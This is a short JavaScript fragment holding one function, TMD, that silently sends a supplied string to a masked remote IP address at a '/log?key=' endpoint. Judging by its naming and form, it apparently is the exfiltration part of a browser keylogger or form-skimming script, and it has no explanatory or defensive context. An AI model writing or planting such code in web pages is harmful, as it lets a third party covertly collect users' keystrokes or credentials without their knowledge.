function TMD(str){
	var xmlHttp = new XMLHttpRequest(); 
	xmlHttp.open("GET", 'http://xx.xx.xx.xx:5387/log?key='+str, true); 
	xmlHttp.send(null); 
}
